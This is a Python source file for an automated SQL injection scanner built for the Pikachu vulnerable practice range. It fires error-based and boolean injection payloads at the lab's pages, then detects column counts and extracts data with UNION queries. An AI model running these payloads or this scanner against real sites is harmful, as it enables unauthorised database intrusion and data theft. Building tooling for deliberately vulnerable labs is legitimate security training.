from core.sqli_scanner import SQLInjectionScanner
from urllib.parse import urlparse
import os
import requests

class PikachuSQLiScanner(SQLInjectionScanner):
    """Pikachu靶场专用SQL注入扫描器"""
    
    def __init__(self, base_url, output_callback=None, progress_callback=None, changes_callback=None, enable_file_output=False):
        """
        初始化Pikachu扫描器
        
        参数:
            base_url: Pikachu靶场基础URL或完整URL
            output_callback: 输出回调函数
            progress_callback: 进度更新回调函数
            changes_callback: 页面变化回调函数，用于将页面变化信息传递给GUI
            enable_file_output: 是否启用文件输出功能
        """
        # 解析URL，提取基础URL和具体页面
        parsed_url = urlparse(base_url)
        if 'sqli_' in base_url:
            # 用户输入了完整URL，提取基础URL
            path_parts = parsed_url.path.split('/')
            # 找到sqli_文件之前的路径作为基础URL
            base_path = ''
            for part in path_parts:
                if 'sqli_' in part:
                    break
                if part:
                    base_path += '/' + part
            self.base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{base_path}"
            self.target_url = base_url
        else:
            # 用户输入了基础URL
            self.base_url = base_url
            self.target_url = None
        
        super().__init__(self.base_url, output_callback, progress_callback, changes_callback, enable_file_output)
    
    def test_connection(self):
        """测试与靶场的连接，使用target_url或默认页面"""
        try:
            # 如果存在target_url，使用它测试；否则使用基础URL拼接默认页面
            if self.target_url:
                test_url = self.target_url
            else:
                test_url = f"{self.base_url}/vul/sqli/sqli_search.php"
            
            response = requests.get(test_url, timeout=10)
            if response.status_code == 200:
                self.print("[+] 连接成功！")
                return True
            else:
                self.print(f"[-] 连接失败，状态码: {response.status_code}")
                return False
        except Exception as e:
            self.print(f"[-] 连接错误: {str(e)}")
            return False
    
    def determine_injection_type_and_method(self, url):
        """
        从URL自动判断注入类型和HTTP方法
        
        参数:
            url: 目标URL
            
        返回:
            (injection_type, http_method, test_function)
        """
        parsed_url = urlparse(url)
        path = parsed_url.path
        
        # 基于URL路径判断注入类型
        if 'sqli_id.php' in path:
            return '数字型注入', 'POST', self.test_numeric_injection
        # elif 'sqli_str.php' in path:
        #     return '字符型注入', 'GET', self.test_string_injection
        # elif 'sqli_search.php' in path:
        #     return '搜索型注入', 'GET', self.test_search_injection
        # elif 'sqli_x.php' in path:
        #     return 'XX型注入', 'GET', self.test_xx_injection
        else:
            # 默认使用xx型注入
            return 'XX型注入', 'GET', self.test_xx_injection
    
    def test_numeric_injection(self):
        """测试数字型注入 (sqli_id.php)"""
        self.print("\n[*] 开始测试数字型注入...")
        if self.target_url and 'sqli_id.php' in self.target_url:
            url = self.target_url
        else:
            url = f"{self.base_url}/vul/sqli/sqli_id.php"
        
        # 首先测试正常请求
        normal_response = self.send_request(url, method='POST', data={'id': '1', 'submit': '查询'})
        if not normal_response:
            return False, None, None, None, None
            
        # 测试基于错误的注入 - 尝试不同的闭合方式
        test_payloads = ["1'", '1"', "1')", '1\")', "1`"]
        
        for payload in test_payloads:
            response = self.send_request(url, method='POST', data={'id': payload, 'submit': '查询'})
            is_vul, db_type = self.is_vulnerable(response)
            if is_vul:
                self.print(f"[!] 数字型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
                return True, 'POST', 'id', {'submit': '查询'}, payload
        
        # 测试基于布尔的盲注
        # true_payloads = ["1 AND 1=1", "1 AND 1=1 # ", "1 AND 1=1 #"]
        # false_payloads = ["1 AND 1=2", "1 AND 1=2 # ", "1 AND 1=2 #"]
        
        # for i in range(len(true_payloads)):
        #     if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'POST', 'id', {'submit': '查询'}):
        #         self.print(f"[!] 数字型注入 - 发现基于布尔的SQL注入漏洞！")
        #         return True, 'POST', 'id', {'submit': '查询'}
            
        self.print("[-] 数字型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None, None

    def test_string_injection(self):
        """测试字符型注入 (sqli_str.php)"""
        self.print("\n[*] 开始测试字符型注入...")
        if self.target_url and 'sqli_str.php' in self.target_url:
            url = self.target_url
        else:
            url = f"{self.base_url}/vul/sqli/sqli_str.php"
        
        # 测试基于错误的注入
        error_payload = "vince'"
        response = self.send_request(url, params={'name': error_payload, 'submit': '查询'})
        is_vul, db_type = self.is_vulnerable(response)
        if is_vul:
            self.print(f"[!] 字符型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
            return True, 'GET', 'name', None
            
        # 测试基于布尔的盲注
        true_payload = "vince' AND '1'='1"
        false_payload = "vince' AND '1'='2"
        if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
            self.print("[!] 字符型注入 - 发现基于布尔的SQL注入漏洞！")
            return True, 'GET', 'name', None
            
        self.print("[-] 字符型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def test_search_injection(self):
        """测试搜索型注入 (sqli_search.php)"""
        self.print("\n[*] 开始测试搜索型注入...")
        if self.target_url and 'sqli_search.php' in self.target_url:
            url = self.target_url
        else:
            url = f"{self.base_url}/vul/sqli/sqli_search.php"
        
        # 测试基于错误的注入
        error_payload = "a%'"
        response = self.send_request(url, params={'name': error_payload, 'submit': '搜索'})
        is_vul, db_type = self.is_vulnerable(response)
        if is_vul:
            self.print(f"[!] 搜索型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
            return True, 'GET', 'name', None
            
        # 测试基于布尔的盲注
        true_payload = "a%' AND 1=1 AND '%'='"
        false_payload = "a%' AND 1=2 AND '%'='"
        if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
            self.print("[!] 搜索型注入 - 发现基于布尔的SQL注入漏洞！")
            return True, 'GET', 'name', None
            
        self.print("[-] 搜索型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None

    def test_xx_injection(self):
        """测试XX型注入 (sqli_x.php)"""
        self.print("\n[*] 开始测试XX型注入...")
        url = self.target_url
        
        # 测试不同的闭合方式
        test_payloads = ["1'","1')", '1\")', "1`)", "1') # ", "1') #"]
        
        for payload in test_payloads:
            response = self.send_request(url, params={'name': payload, 'submit': '查询'})
            is_vul, db_type = self.is_vulnerable(response)
            if is_vul:
                self.print(f"[!] XX型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
                return True, 'GET', 'name', None, payload
        
        # 测试基于布尔的盲注
        # true_payloads = ["1') AND ('1'='1", "1') AND 1=1 # "]
        # false_payloads = ["1') AND ('1'='2", "1') AND 1=2 # "]
        
        # for i in range(len(true_payloads)):
        #     if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'GET', 'id'):
        #         self.print(f"[!] XX型注入 - 发现基于布尔的SQL注入漏洞！")
        #         return True, 'GET', 'id', None, None
            
        self.print("[-] XX型注入 - 未发现明显的SQL注入漏洞")
        return False, None, None, None, None  

    def run_complete_scan(self):
        """运行完整的Pikachu SQL注入扫描"""
        self.print("=" * 30)
        self.print("Pikachu SQL注入自动化扫描器")
        self.print("=" * 30)
        
        # 初始化进度
        self.update_progress(0, "开始扫描")
        
        # 先测试连接
        if not self.test_connection():
            self.print("[!] 无法连接到靶场，请检查网络设置和靶场状态")
            self.update_progress(100, "扫描失败")
            return
        
        self.update_progress(10, "连接成功，分析目标URL")
        
        # 使用默认/用户提供的URL
        target_url = self.target_url
        self.print(f"[+] 使用用户提供的URL: {target_url}")
        
        # 自动判断注入类型和HTTP方法
        injection_type, http_method, test_func = self.determine_injection_type_and_method(target_url)
        self.print(f"[+] 自动判断: {injection_type}, HTTP方法: {http_method}")
        
        # 只测试与URL相关的注入类型
        injection_types = [
            (injection_type, test_func)
        ]
        
        vulnerabilities_found = 0
        total_steps = 4 * 3  # 4种注入类型，每种约3个步骤
        current_step = 1
        
        for i, (name, test_func) in enumerate(injection_types):
            self.print(f"\n{'='*30}")
            self.print(f"测试 {name}")
            self.print(f"{'='*30}")
            
            # 更新进度：测试特定类型的注入
            self.update_progress(min(100, 10 + i * 20), f"测试{name}")
            
            result, method, param, data_template, payload = test_func()
            current_step += 1
            
            if result:
                vulnerabilities_found += 1
                # 更新进度：发现漏洞，准备提取信息
                self.update_progress(min(100, 10 + i * 20 + 5), f"{name}发现漏洞，提取信息")
                
                # 确定闭合模式
                # if name == "数字型注入":
                #     closing_pattern = "numeric"
                # elif name == "字符型注入":
                #     closing_pattern = "string"
                # elif name == "搜索型注入":
                #     closing_pattern = "search"
                # elif name == "XX型注入":
                #     closing_pattern = "xx"
                
                # 使用用户提供的URL或自动判断的URL
                url = target_url
                
                # 判断字段数（detect_column_count内部会更新进度）
                self.update_progress(min(100, 10 + i * 20 + 10), f"{name}检测字段数")
                column_count = self.detect_column_count(url, method, param, data_template, payload)
                current_step += 1
                
                if column_count:
                    # 更新进度：准备提取数据
                    self.update_progress(min(100, 10 + i * 20 + 15), f"{name}提取数据")
                    # 尝试使用UNION查询提取数据
                    self.extract_with_union(url, method, param, data_template, payload, column_count)
                    current_step += 1
        
        # 扫描完成，更新进度到100%
        self.update_progress(100, "扫描完成")
        self.print(f"\n[+] 扫描完成！共发现 {vulnerabilities_found} 个SQL注入漏洞")